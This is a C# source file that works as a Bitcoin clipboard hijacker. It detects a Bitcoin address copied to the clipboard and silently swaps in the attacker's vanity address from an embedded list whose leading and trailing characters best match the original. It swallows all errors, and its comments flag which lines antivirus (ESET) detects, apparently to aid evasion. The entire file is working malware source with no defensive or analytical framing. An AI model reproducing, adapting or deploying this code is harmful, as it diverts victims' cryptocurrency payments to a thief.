using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Main.Properties;

namespace Main.Tools
{
    internal static class BitcoinTools
    {
        internal static bool ProbablyBtcAddress(string clipboard)
        {
            var address = clipboard.Trim();
            // BTC address length from 26 to 34: https://bitcoin.stackexchange.com/questions/36944/what-are-the-minimum-and-maximum-lengths-of-a-mainnet-bitcoin-address
            var r = new Regex("^(1|3)[1-9A-HJ-NP-Za-km-z]{26,34}$");
            if (!r.IsMatch(address)) return false;
            return true;
        }

        internal static void SetMostSimilarBtcAddress(string originalClipboardText)
        {
            try
            {
                var origAddr = originalClipboardText.Trim();

                var bestFirstCharFits = new HashSet<string>();

                var maxFirstCharFit = 0;
                foreach (
                    var a in
                        Resources.vanityAddresses.Split(new[] { Environment.NewLine }, // ESET DETECT LINE
                            StringSplitOptions.RemoveEmptyEntries).ToList()) // ESET DETECT LINE
                {
                    var actFirstCharFit = FirstCharFitNum(a, origAddr);

                    if (actFirstCharFit < maxFirstCharFit)
                    {
                    }
                    else if (actFirstCharFit == maxFirstCharFit)
                    {
                        bestFirstCharFits.Add(a);
                    }
                    else if (actFirstCharFit > maxFirstCharFit)
                    {
                        bestFirstCharFits.Clear();
                        maxFirstCharFit = actFirstCharFit;
                        bestFirstCharFits.Add(a);
                        Clipboard.SetText(a); // ESET DETECT LINE
                    }
                }

                var maxLastCharFit = 0;
                foreach (var a in bestFirstCharFits)
                {
                    var actLastCharFit = LastCharFitNum(a, origAddr);

                    if (actLastCharFit <= maxLastCharFit)
                    {
                    }
                    else
                    {
                        maxLastCharFit = actLastCharFit;
                        Clipboard.SetText(a); // ESET DETECT LINE
                    }
                }
            }
            catch
            {
                // ignored
            }
        }

        private static int LastCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[a.Length - 1 - i] != b[b.Length - 1 - i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }

        private static int FirstCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[i] != b[i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }
    }
}
